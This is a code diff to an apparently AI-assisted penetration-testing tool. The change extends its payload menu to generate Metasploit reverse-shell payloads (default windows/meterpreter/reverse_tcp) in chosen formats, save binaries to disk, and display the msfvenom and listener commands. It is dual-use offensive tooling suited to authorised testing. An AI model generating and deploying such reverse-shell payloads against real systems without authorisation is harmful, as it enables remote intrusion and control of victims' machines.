@@ -309,16 +309,54 @@ Format each command on its own line starting with '$'
         payload_type = self.menu.prompt_choice("Payload type", "windows/meterpreter/reverse_tcp")
 
         if self.metasploit.is_available():
+            # Ask for output format
+            output_format = self.menu.prompt_choice("Output format (exe/elf/raw/python/c)", "exe")
+
             # Generate with msfvenom
-            result = self.metasploit.generate_payload(payload_type, lhost, lport, format="raw")
+            result = self.metasploit.generate_payload(payload_type, lhost, lport, format=output_format)
 
             if result['success']:
                 self.menu.show_success("Payload generated successfully")
+
+                # Save payload to file if it's binary
+                if output_format in ['exe', 'elf', 'raw']:
+                    import os
+                    from pathlib import Path
+                    from datetime import datetime
+
+                    payloads_dir = Path.home() / ".kali-gpt" / "payloads"
+                    payloads_dir.mkdir(parents=True, exist_ok=True)
+
+                    extension_map = {'exe': 'exe', 'elf': 'elf', 'raw': 'bin'}
+                    ext = extension_map.get(output_format, 'bin')
+
+                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+                    payload_file = payloads_dir / f"payload_{timestamp}.{ext}"
+
+                    with open(payload_file, 'wb') as f:
+                        f.write(result['payload'])
+
+                    self.console.print(Panel(
+                        f"Payload saved to: [cyan]{payload_file}[/cyan]\n"
+                        f"Size: [yellow]{len(result['payload'])}[/yellow] bytes",
+                        title="Payload File",
+                        border_style="green"
+                    ))
+                else:
+                    # Text-based payloads (python, c, etc.)
+                    payload_text = result['payload'].decode('utf-8', errors='ignore')
+                    self.console.print(Panel(
+                        payload_text,
+                        title="Generated Payload Code",
+                        border_style="green"
+                    ))
+
+                # Show command used
                 self.console.print(Panel(result['command'], title="Command Used", border_style="cyan"))
 
                 # Show handler command
                 handler = self.metasploit.start_handler(payload_type, lhost, lport)
-                self.console.print(Panel(handler, title="Listener Command", border_style="green"))
+                self.console.print(Panel(handler, title="Listener Command", border_style="yellow"))
             else:
                 self.menu.show_error(f"Payload generation failed: {result['error']}")
         else:
